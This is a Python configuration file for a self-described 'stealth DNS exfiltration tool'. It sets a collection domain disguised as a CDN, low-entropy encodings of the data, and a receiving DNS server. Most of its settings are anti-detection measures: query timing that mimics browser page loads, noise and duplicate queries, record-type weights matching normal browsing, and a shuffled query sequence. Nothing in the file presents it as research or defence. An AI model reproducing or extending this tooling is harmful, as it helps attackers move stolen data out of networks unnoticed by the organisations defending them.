"""Configuration for stealth DNS exfiltration tool."""

# --- Domain Configuration ---
# Must be a domain you control with NS records pointing to your server
BASE_DOMAIN = "analytics-cdn.example.com"

# --- Encoding Strategy ---
# "hex_split" = lower entropy hex labels with CDN-like prefixes
# "wordlist"  = each byte mapped to an English word (lowest entropy)
ENCODING_STRATEGY = "hex_split"
HEX_LABEL_LENGTH = 8       # total chars per label including prefix
LABELS_PER_QUERY = 4        # data labels per DNS query

# --- Integrity ---
HASH_ALGORITHM = "sha256"

# --- Anti-Detection: Timing (burst-silence model) ---
# Mimics browser page-load pattern: burst of queries, then reading pause
BURST_SIZE_MIN = 3
BURST_SIZE_MAX = 8
INTRA_BURST_DELAY = (0.02, 0.15)   # seconds between queries in a burst
INTER_BURST_DELAY = (2.0, 15.0)    # seconds between bursts (reading time)

# --- Anti-Detection: Noise ---
NOISE_RATIO = 3                 # noise queries per data query
NOISE_DOMAINS_FILE = "noise_domains.txt"
DUPLICATE_QUERY_RATE = 0.15     # probability of re-sending a previous query

# --- Anti-Detection: Record Types ---
# Weighted distribution matching normal browsing patterns
QUERY_TYPE_WEIGHTS = {"A": 70, "AAAA": 25, "CNAME": 5}

# --- Anti-Detection: Sequence Obfuscation ---
# Shared secret between client and server for sequence permutation
SEQUENCE_SEED = 0xDEADBEEF
SEQUENCE_PRIME = 65537          # prime for modular arithmetic shuffle

# --- Server (dns_server.py) ---
DNS_PORT = 53
RESPONSE_IP_POOL = [
    "104.16.132.229", "104.16.133.229",
    "172.67.134.180", "172.67.135.180",
    "104.21.45.67", "104.21.45.68",
]
RESPONSE_TTL = 300              # seconds
OUTPUT_DIR = "./received/"

# --- Protocol ---
METADATA_PREFIX = "m"           # first label prefix for metadata queries
SESSION_ID_LENGTH = 4           # hex chars for session identifier
MAX_RETRIES = 5
